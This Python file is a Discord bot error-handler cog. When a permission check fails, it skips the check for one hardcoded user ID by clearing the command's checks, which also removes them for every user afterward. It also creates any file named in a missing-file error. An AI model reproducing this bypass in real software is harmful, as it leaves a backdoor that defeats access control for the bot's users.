import discord
from discord.ext import commands


class eh(commands.Cog):
    def __init__(self, bot):
        self.bot=bot


    @commands.Cog.listener()
    async def on_command_error(self, ctx, exception:Exception):
        error = getattr(exception, "original", exception)
        if isinstance(error, FileNotFoundError):
            f=open(error.filename, "w+")
            f.close()
            await ctx.command.invoke(ctx)
            return
        if exception.args[0].endswith("run this command."):
            if ctx.author.id == 360493765154045952:
                ctx.command.checks = []
                await self.bot.invoke(ctx)
                return
        await ctx.send(exception)

def setup(bot):
    bot.add_cog(
    eh(bot))